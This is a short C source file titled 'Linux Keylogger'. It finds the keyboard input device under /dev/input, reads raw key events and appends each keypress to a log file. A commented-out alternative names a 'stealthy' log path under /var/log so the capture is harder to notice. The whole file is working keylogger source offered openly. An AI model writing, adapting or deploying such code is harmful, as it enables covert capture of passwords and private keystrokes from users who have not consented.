// Linux Keylogger
//
// Author: Kyri Lea

#include <linux/input.h>
#include <regex.h>
#include <signal.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>

char keymap[59][12] = {
    " ",           "[ESC]",   "1",     "2", "3", "4",       "5",
    "6",           "7",       "8",     "9", "0", "-",       "=",
    "[BACKSPACE]", "[TAB]",   "q",     "w", "e", "r",       "t",
    "y",           "u",       "i",     "o", "p", "[",       "]",
    "[ENTER]",     "[CTRL]",  "a",     "s", "d", "f",       "g",
    "h",           "j",       "k",     "l", ";", "'",       "[GRAVE]",
    "[SHIFT]",     "\\",      "z",     "x", "c", "v",       "b",
    "n",           "m",       ",",     ".", "/", "[SHIFT]", "[FN]",
    "[ALT]",       "[SPACE]", "[CAPS]"};

int main() {
  FILE *fp;
  FILE *lf;
  FILE *inputdev;
  char inputfile[30];

  // Find the input file
  inputdev = popen("readlink -f /dev/input/by-path/$(ls /dev/input/by-path/ "
                   "2>/dev/null | grep kbd)",
                   "r");
  if (inputdev == NULL) {
    printf("Event file couldn't be found.\n");
    exit(2);
  }

  fgets(inputfile, 29, inputdev);
  inputfile[strlen(inputfile) - 1] = '\0';
  pclose(inputdev);

  // Open the input file
  fp = fopen(inputfile, "r");
  if (fp == NULL) {
    printf("Error opening input file.\n");
    exit(2);
  }

  // Create and open the log file
  // lf = fopen("/var/log/journal.log", "a");  // Stealthy file
  lf = fopen("keylog", "a");
  if (lf == NULL) {
    printf("Error opening log file.\n");
    exit(2);
  }

  // Read input events and log them
  struct input_event ev;
  while (1) {
    fread(&ev, sizeof(ev), 1, fp);
    if (ev.type == EV_KEY && ev.value == 1) {
      printf("%s\n", keymap[ev.code]);
      fprintf(lf, "%s\n", keymap[ev.code]);
      fflush(lf);
    }
  }

  // Need to fix loop to get here
  fclose(fp);
  fclose(lf);
}
